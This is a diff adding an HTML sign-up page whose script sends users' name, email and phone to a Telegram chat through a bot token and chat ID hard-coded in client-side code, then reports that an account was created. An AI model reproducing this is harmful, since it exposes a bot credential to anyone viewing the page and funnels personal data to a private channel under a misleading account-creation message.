@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Create Account</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #6a11cb 25%, #2575fc 100%);
+            color: #fff;
+            background-attachment: fixed;
+            background-size: cover;
+        }
+        .form-container {
+            background: rgba(255, 255, 255, 0.9); /* Semi-transparent white for a clean look */
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 400px;
+            color: #333;
+        }
+        .form-container h2 {
+            margin-bottom: 20px;
+            text-align: center;
+            color: #007BFF;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        .form-group button {
+            width: 100%;
+            padding: 12px;
+            background: #007BFF;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+        .form-group button:hover {
+            background: #0056b3;
+        }
+        .feedback {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        .feedback.success {
+            color: green;
+        }
+        .feedback.error {
+            color: red;
+        }
+        .terms {
+            margin-top: 20px;
+            font-size: 12px;
+            text-align: center;
+            color: #555;
+        }
+        .terms a {
+            color: #007BFF;
+            text-decoration: none;
+        }
+        .terms a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <h2>Create Account</h2>
+        <form id="clientForm">
+            <div class="form-group">
+                <label for="name">Full Name:</label>
+                <input type="text" id="name" name="name" placeholder="Enter your name" required>
+            </div>
+            <div class="form-group">
+                <label for="email">Email Address:</label>
+                <input type="email" id="email" name="email" placeholder="Enter your email" required>
+            </div>
+            <div class="form-group">
+                <label for="phone">Phone Number:</label>
+                <input type="text" id="phone" name="phone" placeholder="Enter your phone number" required>
+            </div>
+            <div class="form-group">
+                <button type="submit">Sign Up</button>
+            </div>
+        </form>
+        <div id="feedback" class="feedback"></div>
+        <div class="terms">
+            By signing up, you agree to our <a href="#">Terms and Conditions</a>.
+        </div>
+    </div>
+
+    <script>
+        // Select the form and feedback elements
+        const form = document.getElementById('clientForm');
+        const feedback = document.getElementById('feedback');
+
+        // Handle form submission
+        form.addEventListener('submit', async (event) => {
+            event.preventDefault(); // Prevent default form submission
+
+            // Retrieve input values
+            const name = document.getElementById('name').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+
+            // Telegram bot credentials
+            const apiToken = '7800822693:AAHrRhfkEYVyeYuCYhEzTdwXcSedyGsoxBs';
+            const chatId = '6628296498';
+
+            // Prepare the message
+            const message = `New Account Created:\nName: ${name}\nEmail: ${email}\nPhone: ${phone}`;
+            const url = `https://api.telegram.org/bot${apiToken}/sendMessage`;
+
+            try {
+                // Send the data to the Telegram API
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: message }),
+                });
+
+                // Handle the response
+                if (response.ok) {
+                    feedback.textContent = 'Your account has been successfully created!';
+                    feedback.className = 'feedback success';
+                    form.reset(); // Clear the form
+                } else {
+                    feedback.textContent = 'Failed to create your account. Please try again.';
+                    feedback.className = 'feedback error';
+                }
+            } catch (error) {
+                feedback.textContent = 'Error occurred: ' + error.message;
+                feedback.className = 'feedback error';
+            }
+        });
+    </script>
+</body>
+</html>
